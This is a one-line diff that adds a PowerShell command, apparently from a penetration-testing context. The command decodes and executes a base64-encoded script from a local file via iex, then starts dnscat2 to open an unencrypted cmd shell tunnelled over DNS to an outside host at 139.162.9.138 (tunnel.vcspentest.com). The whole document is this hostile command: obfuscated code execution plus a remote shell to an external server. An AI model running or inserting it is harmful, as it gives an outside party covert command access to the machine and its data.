@@ -1,0 +1,1 @@
+$encodedScript = Get-Content .\encoded_script.txt -Raw; $decodedScript = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedScript)); iex $decodedScript; Start-Dnscat2 -DNSserver 139.162.9.138 -Domain tunnel.vcspentest.com -Exec cmd -NoEncryption
